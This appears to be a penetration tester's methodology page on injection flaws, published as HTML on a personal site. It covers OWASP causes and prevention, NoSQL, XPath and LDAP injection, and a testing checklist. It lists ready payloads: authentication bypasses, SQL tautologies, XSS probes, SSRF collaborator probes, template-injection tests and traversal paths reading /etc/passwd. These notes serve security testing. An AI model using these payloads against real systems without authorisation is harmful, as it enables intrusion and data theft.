@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="845bc9e2-74a9-4273-adc7-1edf92d98a72" class="page sans"><header><h1 class="page-title">Injections</h1><p class="page-description"></p></header><div class="page-body"><p id="278b1412-8681-4811-85ef-0bcb7c82223e" class=""><a href="https://owasp.org/Top10/A03_2021-Injection/">https://owasp.org/Top10/A03_2021-Injection/</a></p><p id="088349ba-3dab-48ef-9798-844328cf67f7" class="">
+</p><p id="5d4bcd94-719f-4039-8f47-a2a8bab601c9" class="">Causes:</p><ul id="12e535e3-071b-4c14-9fb0-972d5f8c8950" class="bulleted-list"><li style="list-style-type:disc">User-supplied data is not validated, filtered, or sanitized by the application.</li></ul><ul id="473c1bf9-0360-4566-b921-66c2323bf2e1" class="bulleted-list"><li style="list-style-type:disc">Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.</li></ul><p id="316a9ec2-5f76-4f42-b884-ef12d676738b" class=""><strong>Examples:</strong></p><p id="8600f87c-31f8-46e9-b3b2-1ca1a4cd05c5" class="">XSS (See page)</p><p id="3c64a5b5-2dd2-4753-ab78-fe029e40b7af" class="">SQL Injection (See page)</p><p id="ad48ae4f-b429-463a-8e03-d35c0b9f5a71" class="">Command Injection (See page)</p><p id="f3d75b10-3299-4ad2-9624-93767f2064bb" class="">
+</p><p id="693ffb8e-57c8-4782-abac-c2b66a3637f5" class="">Prevention</p><ul id="61ec2ba6-8cb0-4e44-84a9-735bd064d852" class="bulleted-list"><li style="list-style-type:disc">Keep data separate from commands and queries</li></ul><ul id="123c8aa1-b03c-4e17-9f0d-61920508f8bc" class="bulleted-list"><li style="list-style-type:disc">Parameterized Statements<ul id="9ca1e0c8-06de-459c-80d3-96a0fefe05f7" class="bulleted-list"><li style="list-style-type:circle">Ensure inputs (parameters) are used safely in SQL statements</li></ul><ul id="d9ff054e-015d-4e82-8367-3c2bb94d25e0" class="bulleted-list"><li style="list-style-type:circle">Example: “SELECT * FROM users WHERE email =?”;</li></ul><ul id="f7a1a5f0-8b6c-46ec-8b8c-314b76b3bbdc" class="bulleted-list"><li style="list-style-type:circle">Example: “SELECT * FROM users WHERE email =’” + email + “’”;</li></ul></li></ul><ul id="4354e288-1f59-4ade-b8b4-bd3d9c79b294" class="bulleted-list"><li style="list-style-type:disc">Sanitizing Input</li></ul><ul id="957ba071-e371-46c6-8055-e82bd3d72231" class="bulleted-list"><li style="list-style-type:disc">For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.</li></ul><ul id="cf036a9d-5c98-49fd-a719-76244e31557b" class="bulleted-list"><li style="list-style-type:disc">Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</li></ul><p id="889a2e47-d19f-4aaf-91a0-11254d7becf9" class="">
+</p><p id="a0c84c8f-1eac-43bf-9a97-676acdb65f9a" class="">
+</p><h1 id="3bdce567-b70f-4ea6-9e6b-6b1e901224db" class=""><strong>Other injection types:</strong></h1><h2 id="bc019fa9-fb43-40ee-a800-1ef05e2763d3" class=""><strong>NoSQL injection:</strong></h2><ul id="12f8c180-d6b3-419d-a497-beaeb11d7af0" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection</a></li></ul><p id="26b456b9-539a-451e-9f91-af8eafe50045" class="">Fuzzing strings (Detection):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="746201d1-63ed-4286-9f9f-270be0b327a6" class="code"><code class="language-JavaScript">&quot;
+&#x27;
+`
+{
+}
+$
+;
+
+---
+
+
+&#x27;&quot;`{
+;$Foo}
+$Foo \xYZ
+
+--- JSON ---
+
+&#x27;\&quot;`{\r;$Foo}\n$Foo \\xYZ\u0000</code></pre><p id="e2224e40-c35a-45ef-b152-361247944720" class="">Regular auth bypass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="95c1c140-a2c4-4ff5-ae6f-7532ae04b9d9" class="code"><code class="language-Java">{
+&quot;username&quot;:&quot;user&quot;
+&quot;password&quot;:{$ne:&quot;&quot;}
+}</code></pre><p id="f54bf60e-9973-4546-bcc8-df4fa4e420b4" class="">Blind:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="234bfcef-5df8-4e1f-b6b1-869c289ca97d" class="code"><code class="language-Java"></code></pre><p id="0f7f7926-8a4a-4e40-8573-49bb26e8bfcb" class="">
+</p><p id="359a8466-241c-442d-845e-a7346782d19e" class="">Injection types:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d2d50e90-75ea-48ca-afec-b014fa31d0f6" class="code"><code class="language-JavaScript">#Assume input is being placed in the following query:
+# if((this.answer == &#x27;answer&#x27; &amp;&amp; this.limit == 3 )){// Do something}
+
+&#x27; &amp;&amp; 1 == 1
+&#x27; &amp;&amp; &#x27;1&#x27; == &#x27;1
+&#x27; || 1 == 1
+&#x27; || &#x27;1&#x27; == &#x27;1
+&#x27; || 1 ||
+&#x27; || 1 || &#x27;
+</code></pre><h2 id="cd84d9c6-a172-407e-9e9f-909bd18f724c" class=""><strong>XPATH injection:</strong></h2><p id="d253232b-2e77-46e5-81be-b69df53a421a" class="">Detection:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6e8edba2-2ecc-43c4-a924-e44ff1bd37f9" class="code"><code class="language-Java">&#x27;
+../../</code></pre><ul id="1f0772ab-96ba-42d4-aa20-9a372865d978" class="bulleted-list"><li style="list-style-type:disc">Try ../../ to select more of the page…</li></ul><ul id="448abb0e-23ef-4a0c-9212-143b629dbdc7" class="bulleted-list"><li style="list-style-type:disc">Checks for SQL injection work for XPATH as well..</li></ul><ul id="c533f1f4-1d1a-4585-a79f-b39bde093893" class="bulleted-list"><li style="list-style-type:disc">We can injection using clauses like “and” to close to for conditional statements about the XPATH environments </li></ul><ul id="ffe1d505-1a77-43d6-803e-9e57e3f483f5" class="bulleted-list"><li style="list-style-type:disc">Therefore if we cant find a SQL injection it is possible that the vulnerability is a XPATH injection instead!</li></ul><p id="3673cc54-ffe3-49a3-8578-5dca75366929" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9a9d05cc-1314-4225-8b4f-a0de555f5007" class="code"><code class="language-XML">VALUE&#x27;]/path/to/take/text()) and substring(//path/to[1]/user/text(),1,1)-&#x27;M&#x27; and //another/valid/statement/closing/injection/</code></pre><h2 id="497313af-7fd8-4a8b-87ab-348161535062" class=""><strong>LDAP injection:</strong></h2><ul id="6560faa4-ae2d-4707-badb-f61e28bcfebb" class="bulleted-list"><li style="list-style-type:disc">LDAP injection techniques vary of database technology!</li></ul><ul id="45c3e8e6-51d7-464a-9e2c-86944fbf68b7" class="bulleted-list"><li style="list-style-type:disc">Wildcards: *</li></ul><ul id="b018648c-8c97-4133-92d7-561fa76e9a42" class="bulleted-list"><li style="list-style-type:disc">wildcard + our own injection: *) (name=Tom</li></ul><ul id="e3a72693-c2da-4479-a543-39ce320678f3" class="bulleted-list"><li style="list-style-type:disc">Null bytes: %00</li></ul><ul id="f28adc25-89f9-4641-96a8-a4f8c9244d6c" class="bulleted-list"><li style="list-style-type:disc">Hard to find since LDAP usually doesn&#x27;t produce informative errors…</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5418efe-e265-4f75-bcd6-123f1f0abc00" class="code"><code class="language-Python">*
+)(cn=*
+*))(|(cn=*
+*))%00</code></pre><ul id="0b3ccc65-1261-4a8d-b68e-de03e1e7a94d" class="bulleted-list"><li style="list-style-type:disc">To prevent the characters that may interfere with the LDAP query should be blocked</li></ul><p id="22cc7c47-ccca-4a65-9547-41dfc33e867f" class="">
+</p><h2 id="c56e961e-7ea3-4424-aa92-8faaf77791b1" class="">SMTP Injection:</h2><p id="6d0ef45d-7d87-4746-9ddc-e9278e7b8ef6" class="">
+</p><p id="14f40b76-7b8c-40fe-971e-4395015d492e" class="">
+</p><p id="603b1b0f-2ea8-494c-8931-5d24261c50c7" class="">
+</p><p id="0c1c96e5-2db0-4838-bb8d-d15c26f868fa" class=""><strong>Testing for injections:</strong></p><p id="809ac1fe-ec2a-4efd-a325-baac63fa77e2" class="">SQL + XPath injection:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="704b265f-c42e-42f4-ab5a-066c30caa103" class="code"><code class="language-Java">&#x27;
+&quot;
+te&#x27;||&#x27;st
+te&#x27;&#x27;st
+te&#x27; &#x27;st
+te&#x27;+&#x27;st
+
+&#x27; OR 1=1
+&#x27; AND &#x27;a&#x27;=&#x27;a
+
+*RETEST WITH &quot;*
+*BLIND SQLi*</code></pre><p id="871369a9-129c-4744-8be9-eebb211c5899" class="">
+</p><p id="fb418661-42b9-4280-93f8-76793cf75632" class="">XSS - REFLECTED, STORED, DOM</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9399865f-a01f-44af-85bb-cc8eb1a58838" class="code"><code class="language-Java">aardvark
+aardvark&quot;&#x27;&gt;&lt;\/();[]${}`-
+MUST TRY:
+javascript:alert()
+&lt;script&gt;alert()&lt;/script&gt;
+&lt;img src =x onError=alert() /&gt;
+
+No reflection? move on
+No storage elsewhere on app? Move on
+If yes, Check encoding via Burp... 
+
+DOM XSS:
+Run through app with DOM INVADOR</code></pre><p id="c26fda34-f8a4-481f-90bb-f3aa7aabb455" class="">
+</p><p id="349d979b-8af2-4d11-ae0a-aeaa052c9762" class="">SSRF, DNS SSRF, RFI, Parameter based redirection</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ddfc698e-30c0-4239-92c9-457ad081ba71" class="code"><code class="language-Java">&lt;COLLAB&gt;
+https://&lt;COLLAB&gt;
+https://&lt;COLLAB&gt;/#&lt;Original-URL&gt;
+https://&lt;COLLAB&gt;/@&lt;Original-URL&gt;
+URL AND DOUBLE URL ENCODE
+*BLIND SSRF*
+Run through with collaborator everywhere</code></pre><p id="a7cbb4a1-1c16-4e61-8135-465bc0386fd6" class="">
+</p><p id="431ef441-26c2-452b-9e13-e62670121dfa" class="">
+</p><p id="b999252e-d1ef-46ac-8e30-980cad3b840b" class="">EL Injection + SSTI</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ecc0f8fd-f91a-4fcc-b1f3-24c48dc48e75" class="code"><code class="language-Java">Java app? ${{7*7}}, ${7*7}
+Polyglot: 
+</code></pre><p id="5728e345-2800-4f2e-9e21-fcf52dd22a24" class="">
+</p><p id="548fe60b-f421-4ae6-b170-5f85b39e64a0" class="">Directory Traversal + Arbitrary file read</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f589b045-37d4-4a09-a008-c9dcab0b166d" class="code"><code class="language-Java">../../../../../../../../etc/hostname
+../../../../../../../../etc/passwd
+
+C://Windows/win.ini</code></pre><p id="d0a43b52-ae20-46cd-afeb-d8e99237e991" class="">
+</p><p id="3df8a092-420b-4208-852f-7e585d7b3865" class="">LDAP</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5925bfa-d517-48a1-895b-14f39971ecc5" class="code"><code class="language-Java">Authenticaiton bypass
+
+Regular injection</code></pre><p id="eb0fe49b-dce8-4b35-93ad-dda6fda5a1d3" class="">OSCi</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="40319028-9ee6-44b3-a613-716c0855bd94" class="code"><code class="language-Java">Regular blind and OOB</code></pre><p id="c63d69d6-6ed3-4d34-9735-80145aac2ba9" class="">XML Injection</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="636ccfdd-1c79-4282-9979-9516aec41eec" class="code"><code class="language-Java">???</code></pre><p id="e7fd0a31-c258-455d-ae4a-3ec90f650a3b" class="">XXE</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="51a38ac0-6fd7-4b8f-bc03-d1de0f55f320" class="code"><code class="language-Java">
+
+- Application accepts JSON? -&gt; change content type to Content-Type: application/json
+And convert to XML</code></pre><p id="75640573-e7dd-4a17-b7d1-311f6a0f075d" class="">
+</p></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
